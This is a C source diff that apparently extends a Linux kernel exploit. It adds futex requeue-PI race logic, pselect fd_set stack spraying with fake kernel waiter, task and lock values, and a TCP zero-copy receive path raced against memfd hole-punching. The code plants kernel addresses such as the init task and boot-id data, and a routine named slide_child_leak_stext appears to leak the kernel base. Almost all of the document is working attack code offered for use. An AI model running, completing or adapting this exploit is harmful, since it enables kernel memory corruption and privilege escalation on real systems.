@@ -6,6 +6,14 @@
 #define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_PSELECT_PAD_BYTES 0
 #define SLIDE_WAIT_SECONDS 30
+#define SLIDE_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
+#define SLIDE_TCP_ROUTE_ATTEMPTS 2000
+#define SLIDE_TCP_ROUTE_ARM_SEQ 16
+#define SLIDE_TCP_POST_GETSOCKOPT_HOLD 20000
+
+#ifndef TCP_ZEROCOPY_RECEIVE
+#define TCP_ZEROCOPY_RECEIVE 35
+#endif
 
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
@@ -24,7 +32,15 @@ static atomic_int slide_consume_stop;
 static atomic_int slide_consume_sched_ok;
 static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
+static atomic_int slide_punch_go;
+static atomic_int slide_punch_stop;
+static atomic_int slide_punch_phase;
 static int slide_runtime_shift = PSELECT_WAITER_WORD_SHIFT;
+
+struct slide_punch_state {
+  int fd;
+  size_t page_size;
+};
 
 static unsigned long slide_env_ulong(
     const char *name, unsigned long def, unsigned long max) {
@@ -59,6 +75,53 @@ static unsigned long slide_consume_usec(void) {
 
 static unsigned long slide_consumer_core(void) {
   return slide_env_ulong("SLIDE_CONSUMER_CORE", CONSUMER_CORE, 256);
+}
+
+static int slide_consumer_nice(int calls) {
+  const char *arg = getenv("SLIDE_CONSUMER_NICE");
+  char *end = NULL;
+  long value;
+
+  if (!arg || !*arg) {
+    return (calls % 19) + 1;
+  }
+  errno = 0;
+  value = strtol(arg, &end, 0);
+  if (errno || !end || *end || value < -20 || value > 19) {
+    pr_warning("bad SLIDE_CONSUMER_NICE value=%s; using default\n", arg);
+    return (calls % 19) + 1;
+  }
+  return (int)value;
+}
+
+static unsigned long slide_requeue_delay_usec(void) {
+  return slide_env_ulong("SLIDE_REQUEUE_DELAY_USEC", 0, 3000000);
+}
+
+static unsigned long slide_owner_chain_delay_usec(void) {
+  return slide_env_ulong("SLIDE_OWNER_CHAIN_DELAY_USEC", 0, 3000000);
+}
+
+static unsigned long slide_tcp_post_hold(void) {
+  return slide_env_ulong("SLIDE_TCP_POST_GETSOCKOPT_HOLD",
+                         SLIDE_TCP_POST_GETSOCKOPT_HOLD, 1000000);
+}
+
+static unsigned long slide_tcp_route_attempts(void) {
+  return slide_env_ulong("SLIDE_TCP_ROUTE_ATTEMPTS",
+                         SLIDE_TCP_ROUTE_ATTEMPTS, 1000000);
+}
+
+static unsigned long slide_tcp_route_arm_seq(void) {
+  return slide_env_ulong("SLIDE_TCP_ROUTE_ARM_SEQ",
+                         SLIDE_TCP_ROUTE_ARM_SEQ, 1000000);
+}
+
+static uintptr_t slide_stage0_logger_addr(void) {
+  if (env_flag("SLIDE_STAGE0_LOGGER_SLOT2", 1)) {
+    return SLIDE_LOGGERS_0_1 + 0x20;
+  }
+  return SLIDE_LOGGERS_0_1;
 }
 
 static int slide_forced_shift(int *shift) {
@@ -154,6 +217,34 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(ex);
 
   int words_per_set = slide_pselect_words_per_set();
+  if (env_flag("SLIDE_CATSTACK_WORDS", 0)) {
+    struct slide_waiter_word {
+      int word;
+      uint64_t value;
+      const char *name;
+    } words[] = {
+      {0, (env_flag("SLIDE_CATSTACK_W0_LOGGER", 0) ||
+           env_flag("SLIDE_CATSTACK_WONLY_BOOTID", 0)) ?
+          slide_stage0_logger_addr() : fake_w0, "w0"},
+      {2, env_flag("SLIDE_CATSTACK_WONLY_BOOTID", 0) ?
+          SLIDE_RANDOM_BOOT_ID_DATA : 0, "tree_left"},
+      {3, FAKE_WAITER_PRIO, "tree_prio"},
+      {5, slide_stage0_logger_addr(), "pi_parent"},
+      {7, SLIDE_RANDOM_BOOT_ID_DATA, "target"},
+      {8, FAKE_WAITER_PRIO, "pi_prio"},
+      {10, env_flag("SLIDE_FAKE_TASK", 0) ? fake_task : SLIDE_INIT_TASK, "task"},
+      {11, fake_lock, "lock"},
+      {12, 3, "wake_state"},
+    };
+    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
+      struct slide_waiter_word *w = &words[i];
+      slide_pselect_put_waiter_word(
+          in, out, ex, words_per_set, w->word, slide_runtime_shift,
+          w->value, w->name);
+    }
+    return;
+  }
+
   int tree_shift = slide_group_shift("SLIDE_TREE_SHIFT");
   int pi_shift = slide_group_shift("SLIDE_PI_SHIFT");
   int tail_shift = slide_group_shift("SLIDE_TAIL_SHIFT");
@@ -181,6 +272,61 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     slide_pselect_put_waiter_word(
         in, out, ex, words_per_set, w->word, w->shift, w->value, w->name);
   }
+}
+
+static void log_slide_catstack_fdset_words(
+    const fd_set *in, const fd_set *out, const fd_set *ex) {
+  if (!env_flag("SLIDE_DUMP_CATSTACK_FDSET", 0)) {
+    return;
+  }
+
+  int words_per_set = slide_pselect_words_per_set();
+  int w0_word = slide_pselect_global_word(0);
+  int tree_left_word = slide_pselect_global_word(2);
+  int tree_prio_word = slide_pselect_global_word(3);
+  int pi0_word = slide_pselect_global_word(5);
+  int target_word = slide_pselect_global_word(7);
+  int pi_prio_word = slide_pselect_global_word(8);
+  int task_word = slide_pselect_global_word(10);
+  int lock_word = slide_pselect_global_word(11);
+  int wake_word = slide_pselect_global_word(12);
+  int zero_word = slide_pselect_global_word(13);
+
+  pr_info("slide catstack fdset nfds=%d words=%d shift=%d "
+          "w0@%d=%016llx treeleft@%d=%016llx treeprio@%d=%016llx pi0@%d=%016llx "
+          "target@%d=%016llx piprio@%d=%016llx task@%d=%016llx "
+          "lock@%d=%016llx wake@%d=%016llx zero13@%d=%016llx\n",
+          SLIDE_PSELECT_NFDS, words_per_set, slide_runtime_shift,
+          w0_word,
+          (unsigned long long)slide_pselect_get_global_word(
+              in, out, ex, words_per_set, w0_word),
+          tree_left_word,
+          (unsigned long long)slide_pselect_get_global_word(
+              in, out, ex, words_per_set, tree_left_word),
+          tree_prio_word,
+          (unsigned long long)slide_pselect_get_global_word(
+              in, out, ex, words_per_set, tree_prio_word),
+          pi0_word,
+          (unsigned long long)slide_pselect_get_global_word(
+              in, out, ex, words_per_set, pi0_word),
+          target_word,
+          (unsigned long long)slide_pselect_get_global_word(
+              in, out, ex, words_per_set, target_word),
+          pi_prio_word,
+          (unsigned long long)slide_pselect_get_global_word(
+              in, out, ex, words_per_set, pi_prio_word),
+          task_word,
+          (unsigned long long)slide_pselect_get_global_word(
+              in, out, ex, words_per_set, task_word),
+          lock_word,
+          (unsigned long long)slide_pselect_get_global_word(
+              in, out, ex, words_per_set, lock_word),
+          wake_word,
+          (unsigned long long)slide_pselect_get_global_word(
+              in, out, ex, words_per_set, wake_word),
+          zero_word,
+          (unsigned long long)slide_pselect_get_global_word(
+              in, out, ex, words_per_set, zero_word));
 }
 
 void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
@@ -223,6 +369,7 @@ void slide_pselect_stack_copy(void) {
   fd_set out;
   fd_set ex;
   prepare_slide_pselect_fdsets(&in, &out, &ex);
+  log_slide_catstack_fdset_words(&in, &out, &ex);
   pr_info("slide pselect setup shift=%d page=%016zx fake_lock=%016zx "
           "fake_w0=%016zx fake_task=%016zx\n",
           slide_runtime_shift, page_base, fake_lock, fake_w0, fake_task);
@@ -253,6 +400,15 @@ void slide_pselect_stack_copy(void) {
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
   atomic_store(&slide_consume_go, 0);
+  if (env_flag("SLIDE_POST_PSELECT_WAIT_SCHED_OK", 0)) {
+    for (int spin = 0; spin < 10000; spin++) {
+      if (atomic_load(&slide_consume_sched_ok) > 0 ||
+          atomic_load(&slide_consume_last_sched_ret) != -1) {
+        break;
+      }
+      usleep(100);
+    }
+  }
   pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
           "last_sched_ret=%d last_sched_errno=%d\n",
           ret, saved_errno, atomic_load(&slide_consume_calls),
@@ -266,6 +422,231 @@ void slide_pselect_stack_copy(void) {
   }
   close(pipefd[0]);
   close(pipefd[1]);
+}
+
+static int slide_make_tcp_pair(int *client_fd, int *server_fd) {
+  *client_fd = -1;
+  *server_fd = -1;
+
+  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (listener < 0) {
+    return -1;
+  }
+
+  int one = 1;
+  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+
+  struct sockaddr_in addr;
+  memset(&addr, 0, sizeof(addr));
+  addr.sin_family = AF_INET;
+  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+  addr.sin_port = 0;
+  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
+      listen(listener, 1) != 0) {
+    close(listener);
+    return -1;
+  }
+
+  socklen_t addr_len = sizeof(addr);
+  if (getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
+    close(listener);
+    return -1;
+  }
+
+  *client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (*client_fd < 0) {
+    close(listener);
+    return -1;
+  }
+  if (connect(*client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+    close(*client_fd);
+    *client_fd = -1;
+    close(listener);
+    return -1;
+  }
+
+  *server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
+  close(listener);
+  if (*server_fd < 0) {
+    close(*client_fd);
+    *client_fd = -1;
+    return -1;
+  }
+  return 0;
+}
+
+static void *slide_tcp_punch_thread(void *arg) {
+  disable_rseq_for_thread();
+
+  struct slide_punch_state *state = arg;
+  while (!atomic_load(&slide_punch_go)) {
+    sched_yield();
+  }
+
+  while (!atomic_load(&slide_punch_stop)) {
+    if (fallocate(state->fd, 0, 0, SLIDE_PUNCH_SHMEM_LEN) != 0) {
+      pr_warning("slide tcp punch fallocate fill errno=%d\n", errno);
+      continue;
+    }
+    atomic_store(&slide_punch_phase, 1);
+    if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
+                  state->page_size,
+                  SLIDE_PUNCH_SHMEM_LEN - state->page_size) != 0) {
+      pr_warning("slide tcp punch hole errno=%d\n", errno);
+    }
+    atomic_store(&slide_punch_phase, 0);
+  }
+  return NULL;
+}
+
+void slide_tcp_stack_copy(void) {
+  if (!page_base || !fake_lock) {
+    pr_error("slide tcp missing kernel page base=%016zx lock=%016zx\n",
+             page_base, fake_lock);
+    return;
+  }
+
+  pr_info("slide tcp enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
+          "fake_task=%016zx\n",
+          page_base, fake_lock, fake_w0, fake_task);
+
+  int client_fd = -1;
+  int server_fd = -1;
+  int punch_fd = -1;
+  char *map = MAP_FAILED;
+  pthread_t puncher;
+  int puncher_started = 0;
+
+  if (slide_make_tcp_pair(&client_fd, &server_fd) != 0) {
+    pr_error("slide tcp route setup failed errno=%d\n", errno);
+    goto out;
+  }
+  pr_info("slide tcp pair client=%d server=%d\n", client_fd, server_fd);
+
+  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
+  punch_fd = (int)syscall(SYS_memfd_create, "slide-tcp-punch", MFD_CLOEXEC);
+  if (punch_fd < 0) {
+    pr_error("slide tcp memfd_create failed errno=%d\n", errno);
+    goto out;
+  }
+  if (fallocate(punch_fd, 0, 0, SLIDE_PUNCH_SHMEM_LEN) != 0) {
+    pr_error("slide tcp fallocate failed errno=%d\n", errno);
+    goto out;
+  }
+  pr_info("slide tcp punch fd=%d page_size=%zu len=%d\n",
+          punch_fd, page_size, SLIDE_PUNCH_SHMEM_LEN);
+  map = mmap(NULL, SLIDE_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
+             MAP_SHARED, punch_fd, 0);
+  if (map == MAP_FAILED) {
+    pr_error("slide tcp mmap failed errno=%d\n", errno);
+    goto out;
+  }
+  pr_info("slide tcp punch map=%p\n", map);
+  for (size_t off = 0; off < SLIDE_PUNCH_SHMEM_LEN; off += page_size) {
+    map[off] = 0x55;
+  }
+
+  struct slide_punch_state state = {
+    .fd = punch_fd,
+    .page_size = page_size,
+  };
+  if (pthread_create(&puncher, NULL, slide_tcp_punch_thread, &state) != 0) {
+    pr_error("slide tcp punch thread failed errno=%d\n", errno);
+    goto out;
+  }
+  puncher_started = 1;
+
+  atomic_store(&slide_punch_stop, 0);
+  atomic_store(&slide_punch_phase, 0);
+  atomic_store(&slide_punch_go, 1);
+  atomic_store(&slide_consume_stop, 0);
+  atomic_store(&slide_consume_go, 0);
+  atomic_store(&slide_consume_seen, 0);
+  atomic_store(&slide_consume_lost, 0);
+  atomic_store(&slide_consume_enter_sched, 0);
+  atomic_store(&slide_consume_calls, 0);
+  atomic_store(&slide_consume_sched_ok, 0);
+  atomic_store(&slide_consume_last_sched_ret, -1);
+  atomic_store(&slide_consume_last_sched_errno, 0);
+
+  char sendbuf[64];
+  memset(sendbuf, 0x33, sizeof(sendbuf));
+  unsigned long post_hold = slide_tcp_post_hold();
+  unsigned long attempts = slide_tcp_route_attempts();
+  unsigned long arm_seq = slide_tcp_route_arm_seq();
+  pr_info("slide tcp knobs attempts=%lu arm_seq=%lu post_hold=%lu\n",
+          attempts, arm_seq, post_hold);
+
+  for (unsigned long i = 1; i <= attempts; i++) {
+    int calls_before = atomic_load(&slide_consume_calls);
+    send(server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
+    while (atomic_load(&slide_punch_phase)) {
+      sched_yield();
+    }
+    for (int spin = 0; !atomic_load(&slide_punch_phase) && spin < 10000000;
+         spin++) {
+      __asm__ volatile("yield" ::: "memory");
+    }
+
+    unsigned char zc[0x40];
+    memset(zc, 0, sizeof(zc));
+    put64(zc, 0x18, (uint64_t)(uintptr_t)(map + page_size));
+    put32(zc, 0x20, sizeof(sendbuf));
+    put64(zc, 0x28, SLIDE_INIT_TASK);
+    put64(zc, 0x30, fake_lock);
+
+    if (i >= arm_seq) {
+      atomic_store(&slide_consume_go, (int)i);
+    }
+    socklen_t len = sizeof(zc);
+    errno = 0;
+    int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc,
+                         &len);
+    int saved_errno = errno;
+    if (i >= arm_seq) {
+      for (unsigned long spin = 0; spin < post_hold; spin++) {
+        __asm__ volatile("yield" ::: "memory");
+      }
+      atomic_store(&slide_consume_go, 0);
+    }
+
+    int calls = atomic_load(&slide_consume_calls);
+    if (env_flag("SLIDE_TCP_LOG_EACH", 0) ||
+        (i % 100) == 0 || ret != 0 || calls > calls_before) {
+      pr_info("slide tcp seq=%lu ret=%d errno=%d len=%u calls=%d "
+              "sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
+              i, ret, saved_errno, len, calls,
+              atomic_load(&slide_consume_sched_ok),
+              atomic_load(&slide_consume_last_sched_ret),
+              atomic_load(&slide_consume_last_sched_errno));
+    }
+    if (calls > calls_before) {
+      break;
+    }
+  }
+
+out:
+  atomic_store(&slide_consume_go, 0);
+  atomic_store(&slide_consume_stop, 1);
+  atomic_store(&slide_punch_stop, 1);
+  if (puncher_started) {
+    pthread_join(puncher, NULL);
+  }
+  if (map != MAP_FAILED) {
+    munmap(map, SLIDE_PUNCH_SHMEM_LEN);
+  }
+  if (punch_fd >= 0) {
+    close(punch_fd);
+  }
+  if (server_fd >= 0) {
+    close(server_fd);
+  }
+  if (client_fd >= 0) {
+    close(client_fd);
+  }
+  pr_info("slide tcp side effect calls=%d sched_ok=%d\n",
+          atomic_load(&slide_consume_calls),
+          atomic_load(&slide_consume_sched_ok));
 }
 
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
@@ -315,19 +696,24 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int entered = atomic_load(&slide_consume_enter_sched) + 1;
     atomic_store(&slide_consume_enter_sched, entered);
     atomic_store(&slide_consume_calls, calls + 1);
-    pr_info("slide consumer before tgkill tid=%d calls=%d\n", tid, calls);
+    long alive_ret = 0;
+    int alive_errno = 0;
+    if (!env_flag("SLIDE_QUIET_CONSUMER", 1)) {
+      pr_info("slide consumer before tgkill tid=%d calls=%d\n", tid, calls);
+      errno = 0;
+      alive_ret = syscall(SYS_tgkill, getpid(), tid, 0);
+      alive_errno = errno;
+      pr_info("slide consumer before sched tid=%d alive_ret=%ld "
+              "alive_errno=%d\n",
+              tid, alive_ret, alive_errno);
+    }
     errno = 0;
-    long alive_ret = syscall(SYS_tgkill, getpid(), tid, 0);
-    int alive_errno = errno;
-    pr_info("slide consumer before sched tid=%d alive_ret=%ld "
-            "alive_errno=%d\n",
-            tid, alive_ret, alive_errno);
-    errno = 0;
-    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
+    int nice_value = slide_consumer_nice(calls);
+    long ret = sched_setattr_tid(tid, nice_value);
     int saved_errno = errno;
-    pr_info("slide consumer sched tid=%d alive_ret=%ld alive_errno=%d "
-            "sched_ret=%ld sched_errno=%d\n",
-            tid, alive_ret, alive_errno, ret, saved_errno);
+    pr_info("slide consumer sched tid=%d nice=%d alive_ret=%ld "
+            "alive_errno=%d sched_ret=%ld sched_errno=%d\n",
+            tid, nice_value, alive_ret, alive_errno, ret, saved_errno);
     atomic_store(&slide_consume_last_sched_ret, (int)ret);
     atomic_store(&slide_consume_last_sched_errno, saved_errno);
     if (ret == 0) {
@@ -361,11 +747,27 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += SLIDE_WAIT_SECONDS;
 
   atomic_store(&slide_waiter_waiting, 1);
-  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
-           &slide_f_pi_target, 0);
-  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  errno = 0;
+  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+                          &slide_f_pi_target, 0);
+  int wait_errno = errno;
+  if (!env_flag("SLIDE_QUIET_FUTEX", 1)) {
+    pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
+  }
+  errno = 0;
+  long unlock_ret = futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL,
+                             NULL, 0);
+  int unlock_errno = errno;
+  if (!env_flag("SLIDE_QUIET_FUTEX", 1)) {
+    pr_info("slide waiter unlock_chain ret=%ld errno=%d\n", unlock_ret,
+            unlock_errno);
+  }
 
-  slide_pselect_stack_copy();
+  if (env_flag("SLIDE_TCP_ROUTE", 1)) {
+    slide_tcp_stack_copy();
+  } else {
+    slide_pselect_stack_copy();
+  }
   atomic_store(&slide_route_done, 1);
 
   for (;;) {
@@ -384,7 +786,17 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
   }
 
   atomic_store(&slide_owner_started, 1);
-  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  unsigned long owner_delay = slide_owner_chain_delay_usec();
+  if (owner_delay) {
+    usleep((useconds_t)owner_delay);
+  }
+  errno = 0;
+  long chain_ret = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  int chain_errno = errno;
+  if (!env_flag("SLIDE_QUIET_FUTEX", 1)) {
+    pr_info("slide owner lock_chain ret=%ld errno=%d delay_usec=%lu\n",
+            chain_ret, chain_errno, owner_delay);
+  }
 
   for (;;) {
     sleep(1);
@@ -472,9 +884,18 @@ uint64_t slide_child_leak_stext(void) {
     usleep(1000);
   }
 
+  unsigned long requeue_delay = slide_requeue_delay_usec();
+  if (requeue_delay) {
+    usleep((useconds_t)requeue_delay);
+  }
   errno = 0;
-  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
-           &slide_f_pi_target, 0);
+  long requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                              &slide_f_pi_target, 0);
+  int requeue_errno = errno;
+  if (!env_flag("SLIDE_QUIET_FUTEX", 1)) {
+    pr_info("slide cmp_requeue_pi ret=%ld errno=%d delay_usec=%lu\n",
+            requeue_ret, requeue_errno, requeue_delay);
+  }
 
   while (!atomic_load(&slide_route_done)) {
     sleep(1);
